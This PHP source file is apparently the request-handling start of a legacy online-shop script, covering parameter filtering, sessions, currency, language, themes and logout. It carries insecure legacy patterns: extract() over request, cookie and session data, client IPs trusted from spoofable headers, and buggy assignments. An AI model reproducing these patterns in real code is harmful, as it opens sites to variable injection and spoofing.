<?php
if (version_compare(phpversion(), "4.1.0", "<") === true) {
$_GET &= $HTTP_GET_VARS;
$_POST &= $HTTP_POST_VARS;
$_SERVER &= $HTTP_SERVER_VARS;
$_FILES &= $HTTP_POST_FILES;
$_ENV &= $HTTP_ENV_VARS;

if (isset($HTTP_COOKIE_VARS)) $_COOKIE &= $HTTP_COOKIE_VARS;
}
if (!ini_get("register_globals")) {
extract($_GET, EXTR_SKIP);
extract($_POST, EXTR_SKIP);
extract($_COOKIE, EXTR_SKIP);
}
$expos=0;
$view_currency_select_button=1;
$leftmenu=1;
$time_to_work="";
$bottom_worktime="";
$bottom_links="";
$admined="";
$spec_spisok="";
$tfind=0;
$signbutton="";
$use_curl=0;
$extsearch_menu="";
$brzag="";
$interface=0;
function toUpper($str) {
$str = strtr($str, "àáâãäååæçèêëìíîïðñòóôõö÷øùüúûýþÿ",
"ÀÁÂÃÄÅ¨ÆÇÈÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÜÚÛÝÞß");
return strtoupper($str);
}
$firstpage=Array();
$oldthtml="";
$rekm="";
$view_rss=0;
$overbut="";
$wishm=Array();
$wishm2=Array();
$overlibloaded=0;
function strtoken($str, $char) {
$strtoma=Array();
$strtoma=explode($char,$str);
return $strtoma[0];
}
error_reporting (E_ALL ^ E_NOTICE);
$taggs="";
$tit="";
$catidcart="";
$gb="";
$sortecho="";
$hiddens="";
$hiddens2="";
$params="";
$hidaction="";
$onc0="";
$onc2="";
$onc5="";
$onc10="";
$onc9="";
$mod="";
$freedelivery="";
$voterate="";
$op1="";
$op2="";
$op3="";
$op4="";
$op5="";
$op6="";
$ee=Array();
$cityes=Array();
$podstava=Array();
$podstavas=Array();
$posturl=Array(0=>"","0"=>"");
$postname=Array(0=>"","0"=>"");
$indcur="";
$prski="";
$cartloaded=0;
$needcol="";
$form_title="";
Error_Reporting(E_ALL & ~E_NOTICE);

function checkIP($ip) {
if (!empty($ip) && ip2long($ip)!=-1 && ip2long($ip)!=false) {
$private_ips = array (
array('0.0.0.0','2.255.255.255'),
array('10.0.0.0','10.255.255.255'),
array('127.0.0.0','127.255.255.255'),
array('169.254.0.0','169.254.255.255'),
array('172.16.0.0','172.31.255.255'),
array('192.0.2.0','192.0.2.255'),
array('192.168.0.0','192.168.255.255'),
array('255.255.255.0','255.255.255.255')
);

foreach ($private_ips as $r) {
$min = ip2long($r[0]);
$max = ip2long($r[1]);
if ((ip2long($ip) >= $min) && (ip2long($ip) <= $max)) return false;
}
return true;
} else {
return false;
}
}
function determineIP() {

if (checkIP(@$_SERVER["HTTP_CLIENT_IP"])) {
return @$_SERVER["HTTP_CLIENT_IP"];

}
foreach (explode(",",@$_SERVER["HTTP_X_FORWARDED_FOR"]) as $ip) {
if (checkIP(trim($ip))) {
return $ip;
}
}
if (checkIP(@$_SERVER["HTTP_X_FORWARDED"])) {
return @$_SERVER["HTTP_X_FORWARDED"];
} elseif (checkIP(@$_SERVER["HTTP_X_CLUSTER_CLIENT_IP"])) {
return @$_SERVER["HTTP_X_CLUSTER_CLIENT_IP"];
} elseif (checkIP(@$_SERVER["HTTP_FORWARDED_FOR"])) {
return @$_SERVER["HTTP_FORWARDED_FOR"];
} elseif (checkIP(@$_SERVER["HTTP_FORWARDED"])) {
return @$_SERVER["HTTP_FORWARDED"];
} else {
return @$_SERVER["REMOTE_ADDR"];
}
}
$_SERVER["REMOTE_ADDR"] = determineIP();
if (isset($_GET['bb'])) { $bb=$_GET['bb']; } elseif(isset($_POST['bb'])) { $bb=$_POST['bb']; } else { $bb=0; }
if (!preg_match('/^[0-9]+$/i',$bb)) { $bb=0;}
if (isset($_GET['onlyforum'])) { $onlyforum=$_GET['onlyforum']; } elseif(isset($_POST['onlyforum'])) { $onlyforum=$_POST['onlyforum']; } else { $onlyforum=0; }
if (!preg_match('/^[0-9]+$/i',$onlyforum)) { $onlyforum=0;}
if (isset($_GET['au'])) { $au=$_GET['au']; } elseif(isset($_POST['au'])) { $au=$_POST['au']; } else { $au=0; }
if (!preg_match('/^[0-9]+$/i',$au)) { $au=0;}
if(isset($_GET['sign_in'])) { $sign_in=$_GET['sign_in']; } elseif(isset($_POST['sign_in'])) { $sign_in=$_POST['sign_in']; } else { $sign_in=0; }
if (!preg_match('/^[0-9]+$/i',$sign_in)) { $sign_in=0;}
if(isset($_GET['agree'])) { $agree=$_GET['agree']; } elseif(isset($_POST['agree'])) { $agree=$_POST['agree'];} else {$agree=""; }
if (!preg_match('/^[a-zA-Z0-9_]+$/i',$agree)) { $agree="";}
if(isset($_GET['sort'])) { $sort=$_GET['sort']; } elseif(isset($_POST['sort'])) { $sort=$_POST['sort'];} else {$sort=""; }
if (!preg_match('/^[a-zA-Z0-9_]+$/i',$sort)) { $sort="";}
if(isset($_GET['f_user'])) { $f_user=$_GET['f_user']; } elseif(isset($_POST['f_user'])) { $f_user=$_POST['f_user'];} else {$f_user=""; }
if (!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\.\/-]+$/i',$f_user)) { $f_user="";}
if(isset($_GET['aosign'])) { $aosign=$_GET['aosign']; } elseif(isset($_POST['aosign'])) { $aosign=$_POST['aosign'];} else {$aosign=""; }
if (!preg_match('/^[a-zA-Z0-9]+$/i',$aosign)) { $aosign="";}
if(isset($_GET['noregs'])) { $noregs=$_GET['noregs']; } elseif(isset($_POST['noregs'])) { $noregs=$_POST['noregs'];} else {$noregs=""; }
if (!preg_match('/^[yesno]+$/i',$noregs)) { $noregs="";}

$ee=Array();

$reg_in_userfile=0;
$totalweight=0;
$totalvolume=0;
$mainbasket="";
$currentdate="";
$metrosel="";
$countsel="";
$e1="";
$e2="";
$e3="";
$e4="";
$e5="";
$e6="";
$e7="";
$e8="";
$e9="";
$e10="";
$e11="";
$e12="";
$e13="";
$e14="";
$e15="";
$e16="";
$e17="";
$e18="";
$e19="";
$zamen=0;
$icq="";
$warn="";
$added=0;
$total=0;
$errsy="";
$fregid="";

if(isset($_GET['cat'])) $cat=$_GET['cat']; elseif(isset($_POST['cat'])) $cat=$_POST['cat']; else $cat="";
if (!preg_match("/^[a-zA-Z0-9_\/\&\%\ -]+$/i",$cat)) { $cat="";}
if(isset($_GET['currency'])) {$currency=$_GET['currency']; } elseif(isset($_POST['currency'])) { $currency=$_POST['currency']; } else { $currency=""; }
if (!preg_match('/^[a-zA-Z0-9_]+$/i',$currency)) { $currency="";}

if(isset($_GET['catid'])) { $catid=$_GET['catid']; } elseif(isset($_POST['catid'])) { $catid=$_POST['catid']; } else { $catid=0; }
if (!preg_match('/^[a-z0-9_]+$/i',$catid)) { $catid="_";}
if(isset($_GET['rid'])) {$rid=$_GET['rid']; } elseif(isset($_POST['rid'])) { $rid=$_POST['rid'];} else {$rid="0"; }
if (!preg_match('/^[a-z0-9_]+$/i',$rid)) { $rid="0";}
if(isset($_GET['action'])) {$action=$_GET['action']; } elseif(isset($_POST['action'])) { $action=$_POST['action']; } else { $action="";}
if (!preg_match('/^[a-z0-9_]+$/i',$action)) { $action="";}
if(isset($_GET['unifid'])) {$unifid=$_GET['unifid']; } elseif(isset($_POST['unifid'])) {$unifid=$_POST['unifid']; } else { $unifid="";}
if (!preg_match('/^[a-z0-9]+$/i',$unifid)) { $unifid="";}
if(isset($_GET['wishlist'])) { $wishlist=$_GET['wishlist'];} elseif(isset($_POST['wishlist'])) { $wishlist=$_POST['wishlist'];} else {$wishlist=0;}
if (!preg_match('/^[a-z0-9]+$/i',$wishlist)) { $wishlist=0;}
$page_title="";
unset($details);
$details=array("","","","","","","","USER","","","","","","","","","","","","","","","","","","");

$repp=0;
$error="";
if(isset($_GET['mnogo'])) {$mnogo=$_GET['mnogo']; } elseif(isset($_POST['mnogo'])) {$mnogo=$_POST['mnogo'];} else { $mnogo=0;}
if (!preg_match('/^[a-z0-9]+$/i',$mnogo)) { $mnogo="";}
$zemname="";
$gob=""; $fold="."; $repcatid=""; $all_links=""; $razd_links="";
$themecontent="";
$x0003="";
function ExtractString($str, $start, $end) {
$str_low = $str;

 if (strpos($str_low, $start) !== false && strpos($str_low, $end) !== false) {
   $pos1 = strpos($str_low, $start) + strlen($start);
   $pos2 = strpos($str_low, $end) - $pos1;
   return substr($str, $pos1, $pos2);
 }
}
function toLower($str) {
$str = strtr($str, "ÀÁÂÃÄÅ¨ÆÇÈÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÜÚÛÝÞß",
"àáâãäå¸æçèêëìíîïðñòóôõö÷øùüúûýþÿ");
   return strtolower($str);
}
require ("./modules/bad_words.php");
if(isset($_GET['query'])) { $query=$_GET['query']; } elseif(isset($_POST['query'])) { $query=$_POST['query']; } else { $query="";}
if (!isset($query)){$query="";} $query=trim(stripslashes($query)); if (!preg_match('/^[à-ÿÀ-ß¸¨a-zA-Z0-9_\.,\?\:\&\#;\ \%\/\-\(\)]+$/i',$query)) { $query="";}
if ((strlen($query)<$minquery)&&($query!="")) {$tit=""; }




if(isset($_GET['wishzak'])) { $wishzak=$_GET['wishzak']; } elseif(isset($_POST['wishzak'])) { $wishzak=$_POST['wishzak'];} else { $wishzak="";}
if (!preg_match('/^[0-9]+$/i',$wishzak)) { $wishzak="";}
if(isset($_GET['step'])) { $step=$_GET['step']; } elseif(isset($_POST['step'])) { $step=$_POST['step'];} else {$step=1;}
if (!preg_match('/^[0-9]+$/i',$step)) { $step=1;}
if(isset($_GET['regid'])) { $regid=$_GET['regid']; } elseif(isset($_POST['regid'])){ $regid=$_POST['regid'];} else {$regid="";}
if (!preg_match('/^[a-z0-9]+$/i',$regid)) { $regid="";}
$setregid=array();
$setregid2=array();
if(isset($_GET['discont1'])) { $discont1=$_GET['discont1']; } elseif(isset($_POST['discont1'])) { $discont1=$_POST['discont1'];} else { $discont1="na";}
if (!preg_match('/^[0-9\.,-]+$/i',$discont1)) { $discont1="na";}
if(isset($_GET['discont2'])) { $discont2=$_GET['discont2']; } elseif(isset($_POST['discont2'])) { $discont2=$_POST['discont2']; } else {$discont2="na";}
if (!preg_match('/^[0-9\.,-]+$/i',$discont2)) { $discont2="na";}
if(isset($_GET['prop'])) { $prop=$_GET['prop']; } elseif(isset($_POST['prop'])) { $prop=$_POST['prop']; } else {$prop="";}
if (!preg_match('/^[0-9]+$/i',$prop)) { $prop="";}
if(isset($_GET['pm'])) { $pm=$_GET['pm']; } elseif(isset($_POST['pm'])) { $pm=$_POST['pm']; } else {$pm=""; }
if (!preg_match('/^[0-9]+$/i',$pm)) { $pm="";}
if(isset($_GET['sd'])) { $sd=$_GET['sd']; } elseif(isset($_POST['sd'])) { $sd=$_POST['sd']; } else {$sd=""; }
if (!preg_match('/^[0-9]+$/i',$sd)) { $sd="";}

$query_yes=0;
$query=substr($query,0,200);   $query=str_replace("/", "", $query);
$query = str_replace(chr(36) , "", $query);
$query = str_replace(chr(13) , "", $query);
$query = str_replace(chr(27) , "", $query);
$query = str_replace(chr(10) , "", $query);
$query=toLower ($query);
if ($query!="") {$query_ok=1;}
$options="";
$viewpage_title="";
if(isset($_GET['usl'])){
$usl=$_GET['usl'];
} elseif(isset($_POST['usl'])) {
$usl=$_POST['usl'];
} else {$usl="AND";
}
if (!preg_match('/^[ORAND]+$/i',$usl)) { $usl="OR";}$uslovie="|"; if ($usl=="OR") { $uslovie="|"; $ch2="checked "; $ch1=""; } else { $uslovie="."; $ch1="checked "; $ch2="";}
if(isset($_GET['zeme'])) {$zeme=$_GET['zeme']; } elseif(isset($_POST['zeme'])) { $zeme=$_POST['zeme']; } else { $zeme="";}
if (!preg_match('/^[a-zA-Z0-9_\#\.-]+$/i',$zeme)) { $zeme="";}
if(isset($_GET['czeme'])) {$czeme=$_GET['czeme']; } elseif(isset($_POST['czeme'])) {$zeme=$_POST['czeme']; }else {$czeme="";}
if (!preg_match('/^[a-zA-Z0-9_\#\.-]+$/i',$czeme)) { $czeme="";}
if(isset($_GET['login'])) {$login=$_GET['login']; } elseif(isset($_POST['login'])) {$login=$_POST['login']; }else {$login="";}

if (!preg_match('/^[a-zA-Z0-9_\&\#\;\.\/-]+$/i',$login)) { $login="";}
if(isset($_GET['theme'])) {$theme=$_GET['theme']; }elseif(isset($_POST['theme'])) { $theme=$_POST['theme']; }else {$theme=0;}

if (!preg_match('/^[0-9]+$/i',$theme)) { $theme=0;}
if(isset($_GET['register'])){ $register=$_GET['register']; }elseif(isset($_POST['register'])) {$register=$_POST['register']; }else {$register=0;}
if (!preg_match('/^[0-9]+$/i',$register)) { $register=0;}
if(isset($_GET['brand'])) {$brand=$_GET['brand']; }elseif(isset($_POST['brand'])){ $brand=$_POST['brand']; }else {$brand="";}
if (!preg_match('/^[¸¨à-ÿÀ-ßa-zA-Z0-9_\,\.\?\&\#\;\ \%\(\)\/-]+$/i',$brand)) { $brand="";}
if(isset($_GET['password'])) {$password=$_GET['password']; }elseif(isset($_POST['password'])){ $password=$_POST['password'];} else {$password="";}
if (!preg_match('/^[a-zA-Z0-9_\&\#\;-]+$/i',$password)) { $password="";}
if(isset($_GET['zak'])){ $zak=$_GET['zak']; }elseif(isset($_POST['zak'])) {$zak=$_POST['zak']; }else {$zak="";}
if (!preg_match('/^[a-z0-9]+$/i',$zak)) { $zak="";}
if ($zak!=""){$action="viewfile";}
if(isset($_GET['flag'])){ $flag=$_GET['flag']; }elseif(isset($_POST['flag'])) {$flag=$_POST['flag']; }else {$flag="";}
if (!preg_match('/^[a-zA-Z0-9_\.\/-]+$/i',$flag)) { $flag="";}
if(isset($_GET['logout'])) {$logout=$_GET['logout']; }elseif(isset($_POST['logout'])){ $logout=$_POST['logout']; }else {$logout="";}
if (!preg_match('/^[0-9]+$/i',$logout)) { $logout="";}$fold="."; require ("./templates/lang.inc");
$speek=$language;
$shop_license="free";
require("./modules/webcart.php");
$oldanguage=$language;
session_cache_limiter ('nocache');session_name(md5($_SERVER['HTTP_HOST'].$shopdir.$secret_salt));session_start();$sid=session_id();
if ((!isset($_SESSION["user_currency"]))||($_SESSION["user_currency"]=="")){$currency=$init_currency; }
if (!isset($_SESSION["mclosed"])){ $_SESSION["mclosed"]=""; }
if (!isset($_SESSION["auth_times"])){ $_SESSION["auth_times"]=0; }
$cart =& $_SESSION['cart'];
if ((!isset($_SESSION["user_currency"]))||($_SESSION["user_currency"]=="")){$currency=$init_currency; }
if (!ini_get("register_globals")) {if (version_compare(phpversion(), "4.1.0", "<") === true) {if (isset($HTTP_SESSION_VARS)) $_SESSION &= $HTTP_SESSION_VARS;}
if(!empty($_SESSION)) extract($_SESSION, EXTR_SKIP);}
if(!is_object($cart)){
$cart = new webcart();
if ((!@$_SESSION["user_valid"]) || (@$_SESSION["user_valid"]=="")){ $_SESSION['kryptos']=""; $_SESSION['$shopdir']=""; $_SESSION['user_login']=""; $_SESSION['user_password']=""; $_SESSION['user_valid']=""; $_SESSION["user_valid"]=""; }
if ($_SESSION["user_valid"]="") {
$_SESSION["user_login"]="";
$_SESSION["user_password"]="";
$_SESSION["user_ip"]="";
$_SESSION["user_banned"]="";
$_SESSION["user_valid"]="0";
$_SESSION["kryptos"."$shopdir"]=md5($secret_salt.filesize("./index.php"));
}
}
if ((!isset($_SESSION["user_currency"]))||($_SESSION["user_currency"]=="")){
if ($currency==""){
reset($currencies);
$_SESSION['user_currency']="";
while (list ($keycr, $stcr) = each ($currencies)) {
$_SESSION["user_currency"]=$keycr;
break;
}
}
if ($currency!=""){
$found_currency=0;
while (list ($keycr, $stcr) = each ($currencies)) {
if ($currency==$keycr){
$_SESSION['user_currency']="";
$_SESSION["user_currency"]="$keycr";$found_currency=1;
}
}
if ($found_currency==0){
reset($currencies);
$_SESSION['user_currency']="";
while (list ($keycr, $stcr) = each ($currencies)) {
$_SESSION["user_currency"]=$keycr;
break;
}
}
}
} else {
if (isset($currency)){
reset($currencies);
while (list ($keycr, $stcr) = each ($currencies)) {
if ($currency==$keycr){
$_SESSION['user_currency']="";
$_SESSION["user_currency"]="$keycr";
}
}
}
}

$okr=$currencies_round[$_SESSION["user_currency"]];reset($currencies);if ((count($currencies)<=1)||($view_currency_select_button==0)) { $choosecurrency=""; } else {$choosecurrency="<form class=form-inline action=\"".$_SERVER['PHP_SELF']."\" method=GET name=\"choose_currency\"><input type=hidden name=\"query\" value=\"$query\"><input type=hidden name=\"catid\" value=\"$catid\"><input type=hidden name=\"unifid\" value=\"$unifid\"><input type=hidden name=\"action\" value=\"$action\"><input type=hidden name=\"speek\" value=\"$speek\"><select class=input-mini name=\"currency\" onchange=\"javascript:document.choose_currency.submit()\">";$choosecurrency.="<option selected value=\"".$_SESSION["user_currency"]."\">"." ".$currencies_name[$_SESSION["user_currency"]]."</option>";while (list ($keycr, $stcr) = each ($currencies)) {if (($keycr==$_SESSION["user_currency"])&&($keycr!="")) {$kurs=$stcr;$valut=$_SESSION["user_currency"];} else {$choosecurrency.="<option value=\"$keycr\">".$currencies_name[$keycr]."</option>";}}$choosecurrency.="</select></form>";}if (count($currencies)<=1) {$choosecurrency="";}$cart->_update_total();if ($cart->total==0) { $cart->basket_speek=""; $cart->basket_valut=$_SESSION["user_currency"]; }
if ((!@$shop_license) || (@$shop_license=="")){ $shop_license=""; }
if (!preg_match('/^[0-9a-z-]+$/i',$shop_license)) { $shop_license="";}
if ($noregs!="") {
if (!isset($_SESSION["user_noregs"])){
$_SESSION['user_noregs']="";}
$_SESSION["user_noregs"]="$noregs";
}

if ((!isset($_SESSION["user_lang"]))||($_SESSION["user_lang"]=="")){
if ($flag==""){$_SESSION['user_lang']="";$_SESSION["user_lang"]="$language";}
if ($flag!=""){$found_lang=0;
while (list ($keyl, $stl) = each ($langs)) {
if ($flag==$stl){$_SESSION['user_lang'];$_SESSION["user_lang"]="$stl";$found_lang=1;}}
if ($found_lang==0){$_SESSION['user_lang']="";$_SESSION["user_lang"]="$language";}}}
else {if ($flag!=""){
while (list ($keyl, $stl) = each ($langs)) {
if ($flag==$stl){$_SESSION['user_lang']="";$_SESSION["user_lang"]="$stl";}}}}reset($langs);
$speek=$_SESSION["user_lang"];
require ("./templates/flags.inc");
if ($action=="interface_on") {$_SESSION['interface']=1;}
if ($action=="interface_off") {unset($_SESSION['interface']);}
if (!isset($_SESSION['interface'])) {$_SESSION['interface']=0;} else {
if ($_SESSION['interface']==1) {$interface=1;}
}
if (@file_exists("./templates/$template/$language/vars.txt")){

require ("./templates/$template/$language/vars.txt"); @setlocale(LC_CTYPE, $site_nls);
}
if ($affix==1) {$incart_menu=1;}
require ("./templates/$template/$language/config.inc");

if ($regid!="") {
if (isset($reg_as)) {
while (list ($srrnum, $srrline) = each ($reg_as)) {
if (($srrline!="")&&($srrline!="\n")) {
$srmasss=explode("|",$srrline);
if($srmasss[1]!=0) {
$firstregid=$srrnum;
break;
}
}
}
reset ($reg_as);

while (list ($srrnum, $srrline) = each ($reg_as)) {
if (($srrline!="")&&($srrline!="\n")) {
$srmasss=explode("|",$srrline);

$setregid[$srrnum]=$srmasss[1];
$setregid2[$srrnum]=$srmasss[0];
}
}
reset ($reg_as);

}
}
if (isset($setregid[$regid])) { if ($setregid[$regid]==0) { $regid=$firstregid; }
if (($setregid[$regid]==2)||($setregid[$regid]==3)) {$lang[65]=$lang[1166];}
}

require ("./templates/$template/mod_admin.inc");

header("Content-type: text/html; charset=$codepage");
require ("./modules/translit.php");
if (function_exists('curl_init')) {
$use_curl=1;
}
if(isset($_GET['item_id'])) {$item_id=$_GET['item_id'];} elseif(isset($_POST['item_id'])){ $item_id=$_POST['item_id']; }else {$item_id=""; }
if (!preg_match('/^[a-zA-Z0-9_-]+$/i',$item_id)) { $item_id="";}
$mancatid="";
if ($items_db_type!="mysql") { if (file_exists("$base_loc/items/".$item_id.".man")==TRUE) {$tmplid=file("$base_loc/items/".$item_id.".man"); $unifid=trim($tmplid[0]); $mancatid=trim(@$tmplid[1]);}} else {
$mancatid=$item_id; $scriptprefix="mysql_";
}
if ($use_weight!=1) {$kg="";}
if ($use_volume!=1) {$vol="";}
$oldthtml=$theme_file;

$brexist=0;
$brcontents = file("$base_loc/brands.txt");
reset($brcontents);
sort($brcontents);
while (list ($br_num, $brline) = each ($brcontents)) {
$brline=trim($brline);
if (($brand!="")&&($brline==$brand)){
$brexist=1;
}
}
unset ($brcontents,$brline);
if ($brand=="nobrand") {$brexist=1;}
if ($brexist==0) {$brand="";}

$inb0=$lang[31].": ";
if(isset($_GET['perpage'])) {$perpage=$_GET['perpage']; }elseif(isset($_POST['perpage'])) {$perpage=$_POST['perpage']; }else{ $perpage=$goods_perpage; }
if (!preg_match('/^[0-9_]+$/i',$perpage)) { $perpage=$goods_perpage;}
if ($perpage>100) {$perpage=$goods_perpage;}
if(isset($_GET['start'])) {$start=$_GET['start']; }elseif(isset($_POST['start'])) {$start=$_POST['start']; }else {$start=0;}
if (!preg_match('/^[0-9_]+$/i',$start)) { $start=0;}
if ($start>99999) {$start=0;}
if(isset($_GET['starts'])) {$starts=$_GET['starts']; }elseif(isset($_POST['starts'])) {$starts=$_POST['starts'];} else {$starts=0;}
if (!preg_match('/^[a-z0-9_]+$/i',$starts)) { $starts=0;}
if ($starts>99999) {$starts=0;}


if ((isset ($theme_file))&& ($theme_file!="") && (@file_exists("./$theme_file")==false)) {
$theme_file="";
}
$mainbasket="<br><div align=center><a href=\"$htpath/index.php?action=basket\"><b>".$lang[31]."</b></a></div><br>";
if ((!isset($_SESSION["kryptos"."$shopdir"]))||($_SESSION["kryptos"."$shopdir"]=="")) {
$_SESSION["kryptos"."$shopdir"]=md5($secret_salt.filesize("./index.php"));
}
$kryptos=$_SESSION["kryptos"."$shopdir"];

$servername=str_replace("http://", "", str_replace("www.", "", str_replace($_SERVER['SERVER_NAME'], "", $htpath)))."/";
$cookiedir=$servername;
if ($cookiedir=="/") {$cookiedir="";}
if ($cookiedir=="//") {$cookiedir="";}

if ($logout==1){
if(($login!="")||($password!="")) {$details=Array (); $_SESSION["user_login"]="";  $_SESSION["user_password"]=""; $_SESSION["user_valid"]="0"; $valid="0"; $_COOKIE["user_name"]=""; $_COOKIE["user_pass"]=""; SetCookie("user_name", "", time()-3600,$cookiedir,$_SERVER['SERVER_NAME']); SetCookie("user_pass", "", time()-3600,$cookiedir,$_SERVER['SERVER_NAME']); $details[1]="";  $module=$smod; $_SESSION["user_login"]=$login;  $_SESSION["user_password"]=$password;} else {
$details=Array ();
require ("./modules/logout.php");
$_SESSION["user_login"]="";  $_SESSION["user_password"]=""; $_SESSION["user_valid"]="0"; $valid="0"; $_COOKIE["user_name"]=""; $_COOKIE["user_pass"]=""; SetCookie("user_name", "", time()-3600,$cookiedir,$_SERVER['SERVER_NAME']); SetCookie("user_pass", "", time()-3600,$cookiedir,$_SERVER['SERVER_NAME']); $details[1]="";  $module=$smod;  $login=""; $password="";
}}$rw0=""; $rw1=""; $rw2="";
if(isset($_GET['rw'])){ $rw=$_GET['rw']; } elseif(isset($_POST['rw'])) { $rw=$_POST['rw'];} else {$rw="";}
if (!preg_match('/^[a-z0-9_]+$/i',$rw)) { $rw="";}
if ((!@$rw) || (@$rw=="")){ $rw=""; } else { require ("./modules/mod_rewrite.php");}
list($msec,$sec)=explode(chr(32),microtime());$HeadTime=$sec+$msec;$crerror="";

$valid=@$_SESSION["user_valid"];
$valid=substr($valid,0,300);
if ($portal==1) {  if ("$valid"=="1") { $viewsite=0; if (($register!=1)&&($action!="restore")) {
if (file_exists("./themes/pi.thtml")) {$theme_file="themes/pi.thtml"; }
}
}

}

if(isset($_GET['clear_spec'])) { $clear_spec=$_GET['clear_spec']; } elseif(isset($_POST['clear_spec'])) { $clear_spec=$_POST['clear_spec'];} else {$clear_spec="";}
if (!preg_match('/^[a-z0-9_]+$/i',$clear_spec)) { $clear_spec="";}
if(isset($_GET['toraz'])) {$toraz=$_GET['toraz']; }elseif(isset($_POST['toraz'])) {$toraz=$_POST['toraz']; }else {$toraz="all";}
if (!preg_match('/^[a-z0-9_]+$/i',$toraz)) { $toraz="all";}
if ($toraz=="all"){ $toraz="_"; }
if(isset($_GET['fid'])) { $fid=$_GET['fid']; } elseif(isset($_POST['fid'])){ $fid=$_POST['fid'];} else {$fid="";}
if (!preg_match('/^[a-z0-9_]+$/i',$fid)) { $fid="";}
if(isset($_GET['cart_id'])) {$cart_id=$_GET['cart_id']; } elseif(isset($_POST['cart_id'])) {$cart_id=$_POST['cart_id']; } else {$cart_id="1";}
if (!preg_match('/^[a-z0-9_]+$/i',$cart_id)) { $cart_id="1";}
if(isset($_GET['action'])) {$action=$_GET['action']; } elseif(isset($_POST['action'])) {$action=$_POST['action']; }else {$action="x";}
if (!preg_match('/^[a-z0-9_]+$/i',$action)) { $action="x";}

$ltypes[0]=$varcart;$ltypes[1]=$varcart;$styl1=" style=\"border: 0px\"";$styl2=" style=\"border: 0px\"";$styl3=" style=\"border: 0px\"";if ((!isset($_SESSION["user_ltype"]))||($_SESSION["user_ltype"]=="")){$_SESSION["user_ltype"]=$varcart; }
if(isset($_GET['ltype'])) {$ltype=$_GET['ltype']; } elseif(isset($_POST['ltype'])) { $ltype=$_POST['ltype']; } else {$ltype=0;}
if (!preg_match('/^[0-9_]+$/i',$ltype)) { $ltype=0;}
if ($ltype==1) {$_SESSION["user_ltype"]=$ltypes[1];}
if ($ltype==2) {$_SESSION["user_ltype"]=$ltypes[2];}if ($ltype==3) {$_SESSION["user_ltype"]=$ltypes[3];}$varcart=$_SESSION["user_ltype"];function toint($ip) {$a=explode(".",$ip);return $a[0]*256*256*256+$a[1]*256*256+$a[2]*256+$a[3];}if (isset($_SESSION["user_basket"])==FALSE){ $_SESSION['user_basket']=""; $_SESSION["user_basket"]="";}if (!isset($_SESSION["user_zeme"])){ $_SESSION["user_zeme"]=""; }if (!isset($_SESSION["user_czeme"])){ $_SESSION["user_czeme"]=""; }if ((isset($_SESSION["user_zeme"])==TRUE)&&($zeme=="")){ $zeme=$_SESSION["user_zeme"]; }if ((isset($_SESSION["user_czeme"])==TRUE)&&($czeme=="")){ $czeme=$_SESSION["user_czeme"]; }if ((isset($_SESSION["user_zeme"])==TRUE)&&($zeme!="")) { $_SESSION["user_zeme"]="$zeme";}
if ((isset($_SESSION["user_czeme"])==TRUE)&&($czeme!="")) { $_SESSION["user_czeme"]="$czeme";}$repzeme="";$repczeme="";if (($theme_file!="themes/".@$_SESSION["user_zeme"].".thtml")&&(@file_exists("./themes/$zeme.thtml")==true)) {$repzeme=str_replace("themes/","",str_replace(".thtml","",$theme_file));}if (($zeme!="") &&(@file_exists("./themes/$zeme.thtml"))) {$theme_file="themes/$zeme.thtml";}if ($zeme=="default") {$repzeme=str_replace("themes/","",str_replace(".thtml","",$theme_file)); $theme_file="";}$themecontent="";$usetheme=0;if ((isset ($theme_file))&& ($theme_file!="") && (@file_exists("./$theme_file")==true)) {$usetheme=1;$themeopen = fopen ("./$theme_file" , "r");$themecontent = @fread($themeopen, @filesize("./$theme_file"));fclose ($themeopen);}if (isset($_SESSION["user_zeme"])==FALSE){ if ($zeme!="") { $_SESSION['user_zeme']=""; $_SESSION["user_zeme"]="$zeme";}}if (isset($_SESSION["user_czeme"])==FALSE){ if ($czeme!="") { $_SESSION['user_czeme']=""; $_SESSION["user_czeme"]="$czeme";}}

$asi="./";
if ((!@$module) || (@$module=="")){ $module=""; }
if (!preg_match('/^[a-z]+$/i',$module)) { $module="";}
$demv="";
$_SESSION["user_module"]=$smod;
if (isset($_SESSION["user_module"])==FALSE){
if ($module==""){$_SESSION['user_module']="";
$_SESSION["user_module"]="$smod";}
if ($module!=""){
$found_mod=0;
while (list ($keyl, $stl) = each ($smods)) {
if ($module==$stl){
$_SESSION['user_module']="";
$_SESSION["user_module"]="$stl";
$found_mod=1;
}
}
if ($found_mod==0){
$_SESSION['user_module']="";
$_SESSION["user_module"]="$smod";
}
}
} else {
if ($module!=""){
while (list ($keyl, $stl) = each ($smods)) {
if ($module==$stl){$_SESSION['user_module']="";
$_SESSION["user_module"]="$stl";
}}}}
if (!@$_SESSION["user_ip"]){
$_SESSION['user_ip']="";$_SESSION['user_banned']="";$_SESSION["user_ip"]="";$_SESSION["user_ip"]="ip_".@$_SERVER['REMOTE_ADDR'];if($show_statip==1) {if (@gethostbyaddr(@$_SERVER['REMOTE_ADDR'])=="inktomisearch.com"){$fileip="./admin/stat_ip/ip_inktomisearch.com.htm";$fileip2="./admin/stat_ip/proxy_inktomisearch.com.htm";} else {if (preg_match("/yahoo/i", @gethostbyaddr(@$_SERVER['REMOTE_ADDR']))){$fileip="./admin/stat_ip/ip_crawl.yahoo.net.htm";$fileip2="./admin/stat_ip/proxy_crawl.yahoo.net.htm";} else {if (preg_match("/msnbot/i", @gethostbyaddr(@$_SERVER['REMOTE_ADDR']))){$fileip="./admin/stat_ip/ip_search.msn.com.htm";$fileip2="./admin/stat_ip/proxy_search.msn.com.htm";}else {$fileip="./admin/stat_ip/".$_SESSION["user_ip"]."_".@gethostbyaddr(@$_SERVER['REMOTE_ADDR']).".htm";$fileip2="./admin/stat_ip/proxy_".@$_SERVER['HTTP_X_FORWARDED_FOR']."_".@gethostbyaddr(@$_SERVER['HTTP_X_FORWARDED_FOR']).".htm";}}}
